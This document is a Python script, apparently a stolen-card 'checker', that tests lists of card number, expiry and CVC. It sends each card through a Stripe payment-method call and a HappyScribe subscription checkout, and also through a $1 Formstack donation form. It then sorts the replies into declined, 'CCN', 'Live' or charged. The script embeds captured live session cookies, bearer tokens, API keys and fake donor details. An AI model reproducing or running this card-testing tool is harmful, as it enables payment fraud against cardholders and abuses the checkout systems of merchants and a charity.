try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests
def nin(ccx):
	import requests,re,base64,jwt,json
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r=requests.session()
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}

	data = f'type=card&billing_details[name]=Apdlla&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F803162f903%3B+stripe-js-v3%2F803162f903%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=89641&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiL2FXaSt3b0ZWMnBZQmdKQmFFMjI0a09mQjF3V1ZRaVd1ZlNmRFhZZmw5TnRVMFZkcTIzaWdVNG5RYWNFUVkxdDlNME1WeU1FSmwyNWEwc1VrSnNIT2JJbSs4RFN6WlpZU0loMFhGNkJoK3BZUHlBTUh6a0tSOUJGeFhJKzU4bXNOTnk1UGxuaXNneE9MbFE0Z3NmZHo2R3JrRXFscjNHRHVOZ2hhbXFyZnkrYVBuYzNmVmtnVDlSOWVlRUNmVjFTL3RDYmZ0dzNMQW5kczJaenZDWjMyVkswQU1YQTFVVDVLdWFQeVNhU3JMc2pKZTRiTWhDWDY3dEkyZDFRVzQrODhXbUIrRU9QTjRNQVpNdEFxNVRPQmtnV1gwUS9wZTdUOTA2Znh3eTVnbVJQY3FWN1RibXR6UUxML09yVE5Fc1NKUFV4RGpwalVSUjlTQ1NreE9EWXRhQ1dlbXhNWFJKYXpOUlE4amlQWlF5ZTh5VDVEK09MVHdwbnpVWXFrT0pLbTBZdlZoRGpMUENvMWRQM2Y0WWZ4Tm5kOXh2SW0veSs5TmhpOVE0RUxvcUVhVUVNN1UyQ0dkVmlqSmlBc0EzNFVWSFNMK3RGSlZSdmVKMHhSSzJZdjVsR1NGdy9VVEJFMW0zSThadjJjV2MzdGhrSGt5VFI1cERQQzhuY2NvL1lIOEFOc0RGYUF6Zmg4NkxsOTY2dUJSa0dxNGdJem5iSEFDd25PbHZWRWlPcnhMQmpPTkFHRWhvSU1WTVhXSU9pWXh0bnRvTS8zazVtUkNVNnVyTlIzQm0vU1VuaXpwNTFQS0ZkRVUrc1cxWlo4WEtLK2pGa20yVndCOGFnY1B3SFRBRmh3clhpak9sZnV6M2ZKeW1HZkk1Z3M1a2NqbWg5S0Y4TEp5R0V0WlpraVlZT2ZHdG5KZ2c0UHN3YjFTK1lESUlxTUgwSGgrU0RtNW51OTJaN1JxcUlYM1BSb3JiZzVQUllSM0RCWWphRkpHTnIxNVB4bzc1SVMwMkRQTlROK3BYNW5hSTQxSlVWOVNPY1JTb0xTRFBpVVB2RWUyWE85YU9NT3ZyKzIwSlJNQWZVUGhpVFBrUHFCTVB0M2pjNGRKc3ZabnFDZHhGMTlkZjEzNmFRVXdWUEdheFdtcmlxeGVTZ0NGUFBDSjByVStTQXhBRmZXRzBta3UxWUFva1I4dFl5YlVJcndDL0R3RmVJVnRzMzg3T1RIRUxTQWI5Y3pwbEd1QkRjYVZFMVBpSmdPWEVOb05CNHlOeW41VDFCbE1OUWo1ZEFsMS9wTTdicXdOWXFkM3hGcjFUcy9JMVVTcVR4Mm9ST1pQNGpiZ3pORWtHeStqRGp2a0JnbXBEcXRIWXEzSExBcFhxVVMveUZvWXNSa2xvUThRZHVOSmRIK3paR3pPVFl2bFJpNWFTKzZMSCtJdm0wVWQrWWZTQkNNNnBmVXpYOWNudHJXSXh4VXEzWTE5d1QwMitVMzVZTENRQUtqelhaZElHVWFhY0NrM1c2UExISVJZRjFnNmxtUkk3bEJiZzhmVlg1UXZQVzhMRG9ncUswL1lmKzdEWkJVYUdUbDdhbUdrN3VjQWQ5ZTdub1FpUnJ6N2FiTFdILytqVmowVEMyU3NPSlRFQ0dpYitJemlJU0pGL00wODV0Y1lJdWlTQTNkNGp3cG9tQVUwMlhrVHJNeWxkazNxanJBZmlyeTVmQXNBaXY0V1dhM0tCc1k4eVZuc1BsT3BuREI1elNrbWd5emN6S1FQeTF0UndXK2pTdEZsR3JPQkJiQjdPcTBrZm5mSUdDUWVtU0VwTThWb2UyNC84QVdvM0ZZVjZOS1JKRnRKL1V2K1hEdVdJaldTbEZqcGlyVHA0d2tRb1AzMHNMZlhGdWd4cWc4R1hUUEpzeXpXK3RVZjNiMHlzRkkrVWdKakNkcmhlUi9GSmgrRm5WL2Q4QlRUTnhSaHdsK25Oc2tVbG5NdlhZdU56NnRjdG5FTTJQREZYMUdOOHRhdVpNdDF4S1Z4bkJNSlRJNW5SUFowTzAraXFQakZPVFI5aFpQUjRtaDk4amtYZHFXN3VGN0hCcVVhdVpoZGg4S1FmY3o0MUNoVEhvWGNKTzF1UlA1R3ZzSm5hdk9qOU5QNE5Hd0xHREVPWW1CaDErNDF5NXpDNndXTzVEMytjQ0Q1dmFrWGNvSlJUV1hNTHFIa3Rpd21yRU1JNTlWV1JSRjF6Ni92Rkg1cEtrYkQ0RGJYOWIzMmF3RXdjdjlEYlM0T29sbUpqaTNMM0FJQXI5bDMxODM0N0E0VnYrcFZPb1Vab0VSb0JRVnQ5TmJzbkV2dTZldVJUN1NHVFVTajdkUXJlVG04UVppS08vNGh2TVRacWE1TS9KNm9EeGxyMnpYNVd3Q2I0ZmQ1ZHlIZUVWendGVzBDTjFtWjlVcHlydDZVNFNOa3BPVFY5M1ZEY01nTXEyOEx1NXlpYlVNYmQ4YitDdlQ3NFVMbGdpd1JuWnpkdGlMQ2luSDRnMXBFNUlIaW9hOGxIcFVkUmN4eFBrbVU0OTgzdUZhYnNvMjZUcnhjcng3MzZvenRrTEMyZVVBSHhydmZHZElZWFFldHNWekdGdk9DMnpNcmtrZ2NKSWVMN0w1WVU4VXg0WEhMQ1ROTTZsMGw4Kyt4RGgvVEhlVGJEY3lNQzFkNVdQVWFOZTlRYXJWcWNuZzVwWXlGVkgxa2w3dm9wQVM4dDFuSEhDMVZYNzNQR2R3S3lyR0hQZWlLNnkveVFycTNKNk1GSFdEVVhDWmxnaVBkcFpVS0cxK210U2hlUnJVMk8rRGpHcDBDU1BsREpmNG5EZWhNVnNwS0U2b2NWaXFzZjZtVUNwV0hISEJNbzVvZTQ9IiwiZXhwIjoxNzMwMDQ3MjE3LCJzaGFyZF9pZCI6MzM5NTEwMzAzLCJrciI6IjM3ZWQ4MzI4IiwicGQiOjAsImNkYXRhIjoibVkxamI3cDAzZlVoOXozaW5lbVNDWEFQMUpQVC9xTlhuSzFMeWYxdldqeUFhZ0NDNmJucWRsaWhzQnhVcjNDdDh5QVdhdVJxWUhvN2tyd3ZpOVpNL3dUY0NUN2VlbU1jaTdqR1IwVHFaZEdhdmt3cnpQZTQrUGxuZ2h4Y1hDV2VDVXQxK1ZhNVUxem1pSFBMOEdGblRCZVJGNVJoZWRhL0Nnemh3dU1OdThuRzhkY0pzSGJ0cXdrZFdEbGpHeXc2eFNZOWt1MldleGxSUkFqLyJ9.IUK9ILHUll6IoH1rceNjfayAxnyx03_qMeg6D1fgIEk'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)


	id = (response.json()['id'])


	import requests

	cookies = {
    'ahoy_visitor': 'd9215c5f-e652-4bfd-8857-a00e4294a8a5',
    '_lfa': 'LF1.1.8a06eddc2d6aef0c.1728643477222',
    'home-page-experiment': 'cvariant',
    '__cf_bm': 'LQE8vvCiAwZvLWKm_b.Fei72sgDyOMKOvA.OMqbF6YM-1730046973-1.0.1.1-JPboc3X.ElWWXlr2_ZMndj8N_cvIYhfxvCG_GTsbJ_4Nksg5aNvlZtOSkEScxloUHB2cHQw6TEVZD20DbAFTng',
    'timezone': 'Africa%2FCairo',
    'ahoy_visit': 'd1f3773f-0754-40ab-932e-d047b2fc3291',
    '_hjSessionUser_488746': 'eyJpZCI6IjMyMzhhYWU3LWVlMGQtNWIwMy1iMDBiLWRkZmNmOTJiNDIzZCIsImNyZWF0ZWQiOjE3Mjg2NDM0NzY0NTAsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_488746': 'eyJpZCI6IjJmZGQ3Mzk2LTNjZTctNDM2Ni04ZTAxLTVkMTBjZjExYTBiNSIsImMiOjE3MzAwNDY5NzgxMzAsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-10-27T16%3A36%3A21.230Z%22%2C%22consentId%22%3A%228b5cbceb-346e-43e8-842b-9c88431cad71%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-10-27T16%3A36%3A21.230Z%22%7D',
    'user_id': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ik1UTXdNVEU1TnprPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLnVzZXJfaWQifX0%3D--c114bd48619bc8d02e5261c725769623c2e0f76f',
    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNekF4TVRrM09WMHNJbFpyYjAxQ1ZHSjRWVzl1ZDJGVVIwaEJOVXhISWl3aU1UY3pNREEwTnpBd05TNDBNekV3T0RFeklsMD0iLCJleHAiOiIyMDI0LTExLTAzVDE2OjM2OjQ1LjQzMVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--a9b9ab5008320f0c52f38331a3f45adbedaad179',
    'unsecure_is_signed_in': '1',
    '_cioid': '13011979',
    'intercom-device-id-frdatdus': 'f8d4a561-a83e-4498-8dfb-d094c8dfcf7a',
    'intercom-session-frdatdus': 'T2hxK2ZoY2ZpQk5naTZWKzF4b1ZWSU1VRThZbnY5TWJpRm01WWE4UUlTdlZJOG9VdFNRM3hLUHo0TzRUbm1oaC0tODJlTDdWT3dYMmw1QktkWEhzNFN3Zz09--d68e2564121931b90057bc398c4739e9faf60068',
    '_transcribe_session': '1Cr2%2BMpAkKHzfjCul9aVKjFRE7bJNqABGHUwj%2F3cygcOBuRTNljEIbRbQIFI0rrd9IH0B3YF6KW3uac9SCAKQEeH9oAsVkf9W0FKkmOyLh5pKLXr%2FmIA6%2FQUStUZdxPOJPq7TaeIFeJafqzburmk%2FUt6bWjUjoocF15iF7NCZWQyS7zjbqNzq3WmRbnZAXJ6iQSxvAbE2QvECdKVPtS6S3iGPoLEmOtMP5uUKN82912U3DE12DcZ5Z4x673%2BzGjmy9cIea2q3lQeq9%2BDK9q58eLc%2FMO47porVT9%2BxgUmcio1xb65MYi4mwIqnLGP%2FA8czDR86X44BtMyDqe9xcbnWC7CDDPbqvdkX5d5fdujh0Q8OvUNQia02LHDXh50ZdGbMtPvWajQ1bxXuuopfZkNh5PNQQ%3D%3D--ZxOteZAM9iNEab7G--bdeejCJOkXZd%2FMr0Qaf7jg%3D%3D',
}

	headers = {
    'authority': 'www.happyscribe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': 'Bearer pixwKiVRPWr27VoYLO9Q3Qtt',
    'content-type': 'application/json',
    'origin': 'https://www.happyscribe.com',
    'referer': 'https://www.happyscribe.com/v2/12509970/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'id': 12189042,
    'address': 'New York ',
    'name': 'Apdlla',
    'country': 'US',
    'vat': None,
    'billing_account_id': 12189042,
    'orderReference': 'nqxfnz',
    'user_id': 13011979,
    'organization_id': 12509970,
    'hours': 0,
    'balance_increase_in_cents': None,
    'payment_method_id': 'pm_1QEZUkKEzvleW5flTMZZfb9I',
    'transcription_id': None,
    'plan': 'basic_2023_05_01',
    'order_id': None,
    'recurrence_interval': 'month',
    'extra_plan_hours': None,
}

	req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
	print(req.json()['error'])
	if 'Retry later' in req.text:
		ms = 'risk'
		return ms
		time.sleep(15)
	try:
		msg = req.json()['error']
		print(ccx,'¦',msg)
		if "Your card has insufficient funds." in req.json()['error']:
			ms = 'Your card has insufficient funds.'
			return ms
		else:
			ms = req.json()['error']
			return ms
	except:
		if 'requires_action' in req.json():
			ms = '3D Required'
			return ms
		else:
			return req.json()
import re

import time

import random

import re,json

import string

import base64

from bs4 import BeautifulSoup

import user_agent

import pyfiglet

import os

import webbrowser

from colorama import Fore

from getuseragent import UserAgent

import datetime

import pytz

foo = False

if foo:

    bar = 1 / 0

from datetime import datetime

current_time = datetime.now()

def capture(string, start, end):

	start_pos, end_pos = string.find(start), string.find(        end, string.find(start) + len(start)

    )

	return (

        string[start_pos + len(start) : end_pos]

        if start_pos != -1 and end_pos != -1

        else None

    )

start = 0
def Tele7(ccx):
	from user_agent import generate_user_agent
	import user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	r=requests.session()
	user = user_agent.generate_user_agent()
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'en-AU,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarylrxtO8wYB0rCO2sV',
	    'Origin': 'https://formstack.io',
	    'Referer': 'https://formstack.io/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	files = [
	    ('inputdate', (None, '11/3/2024 4:21:19')),
	    ('userTimeZone', (None, '300')),
	    ('txtHtmlId', (None, '2hbx1Fv8p-niFCJlWMSc5A')),
	    ('txtSendSizeChange', (None, '')),
	    ('txtObjId', (None, '')),
	    ('txtOrgId', (None, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')),
	    ('txtAuthToken', (None, '')),
	    ('txtRefreshToken', (None, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')),
	    ('txtAccessURI', (None, '')),
	    ('txtSessionID', (None, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')),
	    ('txtSubmittedData', (None, '')),
	    ('formHtml', (None, '')),
	    ('multipageEnabled', (None, 'False')),
	    ('breadcrumbEnabled', (None, 'False')),
	    ('breadcrumbNumbered', (None, 'False')),
	    ('breadcrumbPrefix', (None, '')),
	    ('submitMessage', (None, 'Thank you for your submission!')),
	    ('submitUrl', (None, '')),
	    ('submitBtnText', (None, 'Submit ')),
	    ('prevBtnText', (None, 'Back')),
	    ('nextBtnText', (None, 'Next')),
	    ('pageValType', (None, 'form')),
	    ('txtUserContentId', (None, '')),
	    ('hasCustomCSS', (None, 'True')),
	    ('isCurrentForm', (None, 'False')),
	    ('packageTier', (None, '')),
	    ('isDraft', (None, 'False')),
	    ('saveForLaterEnabled', (None, 'False')),
	    ('saveBtnText', (None, 'Save')),
	    ('discardBtnText', (None, 'Discard')),
	    ('draftSaved', (None, '')),
	    ('draftEmail', (None, '')),
	    ('paymentType', (None, 'Stripe')),
	    ('formName', (None, 'Donation Management Form')),
	    ('formId', (None, '')),
	    ('CommunityInstanceURL', (None, '')),
	    ('CommunitySessioID', (None, '')),
	    ('CommunityUserId', (None, '')),
	    ('CommunityUserType', (None, '')),
	    ('CommunityViewMode', (None, '')),
	    ('comPrefillDataset', (None, '')),
	    ('prefillDataset', (None, '')),
	    ('comPrefillObj', (None, '')),
	    ('hfFileServiceEndpoint', (None, 'https://sfapi.formstack.io')),
	    ('hfFileServiceApiKey', (None, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')),
	    ('reCaptchaV3token', (None, '')),
	    ('submissionWorkflowId', (None, '')),
	    ('isPopulateHTMLFromBackEnd', (None, 'True')),
	    ('hfIsNativePaymentOn', (None, 'False')),
	    ('hfDefaultNativeSiteURL', (None, '')),
	    ('hfPackageNamespace', (None, 'VisualAntidote__')),
	    ('submitRules', (None, '')),
	    ('FSGFRadioButton356', (None, 'Company%20Donation')),
	    ('Contact.npsp__Primary_Affiliation__c.Name', (None, 'New%20yorm')),
	    ('Contact.FirstName', (None, 'williams')),
	    ('Contact.LastName', (None, 'hiro')),
	    ('Contact.Email', (None, 'aa0799414021%40gmail.com')),
	    ('Contact.HomePhone', (None, '5124578451')),
	    ('Contact.npsp__Primary_Affiliation__c.Phone', (None, '5124578451')),
	    ('Contact.Alumni__c', (None, 'No')),
	    ('Contact.Program_Level__c', (None, '')),
	    ('Contact.Completion_Date__c', (None, '')),
	    ('FSGFRadioButton522', (None, '')),
	    ('Contact.CVCC_Employment_Status__c', (None, '')),
	    ('Contact.CVCC_Employment_Type__c', (None, '')),
	    ('Contact.Employee_ID__c', (None, '')),
	    ('FSGFRadioButton346', (None, 'One-Time%20Donation')),
	    ('FSGFDropdown701', (None, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')),
	    ('Contact.Opportunity.A.Amount', (None, '1')),
	    ('FSGFDropdown1000', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.npe03__Installment_Period__c', (None, '')),
	    ('FSGFRadioButton464', (None, '')),
	    ('FSGFRadioButton131', (None, '')),
	    ('FSGFCheckbox915', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.Contact_Me_Regarding_Donation__c', (None, '')),
	    ('FSGFRadioButton436', (None, 'No')),
	    ('Contact.Opportunity.A.Preferred_Name_on_Donaiton__c', (None, '%D8%A7%D8%AA%D8%AA%D8%A7')),
	    ('Contact.npe03__Recurring_Donation__c.B.Preferred_Name_on_Donaiton__c', (None, '')),
	    ('FSGFCheckbox557', (None, '')),
	    ('Contact.Opportunity.A.Additional_Info_Regarding_Gift__c', (None, '')),
	    ('Contact.Opportunity.A.In_Honor_of__c', (None, '')),
	    ('Contact.Opportunity.A.In_Memory_of__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.Additional_Info_Regarding_Gift__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.In_Honor_of__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.In_Memory_of__c', (None, '')),
	    ('Contact.Opportunity.A.Funding_Program__c', (None, 'a0u8V00000AT2h7QAD')),
	    ('inputContact.Opportunity.A.Funding_Program__c', (None, 'The%20School%20of%20Community%20Development%20%26%20Public%20Services%20Education%20%28CDPSE%29%202022-23')),
	    ('inputContact.Opportunity.A.Funding_Program__c', (None, 'The%20School%20of%20Community%20Development%20%26%20Public%20Services%20Education%20%28CDPSE%29%202022-23')),
	    ('Contact.Opportunity.A.CloseDate', (None, '11%2F03%2F2024')),
	    ('Contact.Opportunity.A.Name', (None, 'New%20yorm%20External%20Donation%2011%2F03%2F2024')),
	    ('Contact.Opportunity.A.RecordTypeId', (None, '0128V000001iNcAQAU')),
	    ('inputContact.Opportunity.A.RecordTypeId', (None, 'Donation')),
	    ('inputContact.Opportunity.A.RecordTypeId', (None, 'Donation')),
	    ('Contact.Opportunity.A.CampaignId', (None, '7018V000000sLgrQAE')),
	    ('inputContact.Opportunity.A.CampaignId', (None, 'Online%20Donations')),
	    ('inputContact.Opportunity.A.CampaignId', (None, 'Online%20Donations')),
	    ('Contact.Opportunity.A.Method_of_Payment__c', (None, 'Credit%20Card')),
	    ('Contact.Opportunity.A.StageName', (None, 'Closed%20Won')),
	    ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (None, 'Company%20Donation')),
	    ('Contact.Opportunity.A.Remain_Anonymous__c', (None, 'No')),
	    ('Contact.npe03__Recurring_Donation__c.B.Funding_Program__c', (None, '')),
	    ('inputContact.npe03__Recurring_Donation__c.B.Funding_Program__c', (None, '')),
	    ('inputContact.npe03__Recurring_Donation__c.B.Funding_Program__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.npe03__Amount__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.Name', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.npsp__StartDate__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (None, '')),
	    ('inputContact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (None, '')),
	    ('inputContact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.npsp__RecurringType__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.npsp__Day_of_Month__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.npe03__Date_Established__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.Type_of_donation_company_individual_Rec__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.Donor_wishes_to_remain_anonymous__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.npsp__PaymentMethod__c', (None, '')),
	    ('FSGFRadioButton831', (None, 'Yes')),
	    ('Contact.Opportunity.A.Deduct_From_Payroll__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.Deduct_From_Payroll__c', (None, '')),
	    ('FSGFShortAnswer6', (None, 'william%20Hiro')),
	    ('FSGFShortAnswer776', (None, 'Hiro%20Hiroo')),
	    ('Contact.npe01__AlternateEmail__c', (None, 'aa0799414021%40gmail.com')),
	    ('Contact.AccountId.BillingStreet', (None, '123%20williams%20street%0Azh')),
	    ('Contact.AccountId.BillingCity', (None, 'NY')),
	    ('Contact.AccountId.BillingState', (None, 'New%20York')),
	    ('Contact.AccountId.BillingPostalCode', (None, '10080')),
	    ('Contact.AccountId.BillingCountry', (None, 'United%20States')),
	    ('FFCreditCard14', (None, c)),
	    ('FFCVV14', (None, cvc)),
	    ('FFExpiryMM14', (None, mm)),
	    ('FFExpiryYYYY14', (None, ex)),
	    ('FFCreditCard146', (None, '')),
	    ('FFCVV146', (None, '')),
	    ('FFExpiryMM146', (None, '')),
	    ('FFExpiryYYYY146', (None, '')),
	    ('FFCreditCard713', (None, '')),
	    ('FFCVV713', (None, '')),
	    ('FFExpiryMM713', (None, '')),
	    ('FFExpiryYYYY713', (None, '')),
	    ('Contact.AccountId.Name', (None, 'hiro%20Household')),
	    ('Contact.AccountId.RecordTypeId', (None, '0128V000001iNc8QAE')),
	    ('inputContact.AccountId.RecordTypeId', (None, 'Household%20Account')),
	    ('inputContact.AccountId.RecordTypeId', (None, 'Household%20Account')),
	    ('Contact.npsp__Primary_Affiliation__c.RecordTypeId', (None, '0128V000001iNc9QAE')),
	    ('inputContact.npsp__Primary_Affiliation__c.RecordTypeId', (None, 'Organization')),
	    ('inputContact.npsp__Primary_Affiliation__c.RecordTypeId', (None, 'Organization')),
	    ('FSGFShortAnswer240', (None, '11%2F03%2F2024')),
	    ('Contact.Opportunity.A.Description', (None, '')),
	    ('Contact.Opportunity.A.Payment_Plan_ID__c', (None, '')),
	    ('Contact.npe03__Recurring_Donation__c.B.Payment_Plan_ID__c', (None, '')),
	    ('FSGFShortAnswer446', (None, 'williams_hiro_Monthly_Donation')),
	    ('FSGFShortAnswer929', (None, 'williams_hiro_Annual_Donation')),
	    ('selectedId', (None, '')),
	    ('ReturnUrl', (None, 'https://formstack.io/D5036')),
	]
	
	response = requests.post('https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment', headers=headers, files=files)
	ress = response.text

	if 'declined' in response.text or 'card number is incorrect.' in response.text or 'Sorry, we do not accept this' in response.text or 'expiration' in response.text:
		return('𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝')		
	elif 'security code is incorrect.' in response.text:
		return('CCN ')
	elif 'Your card could not be' in response.text:
		return('Live ')

	else:
		
		return('𝐂𝐇𝐀𝐑𝐆𝐄 ')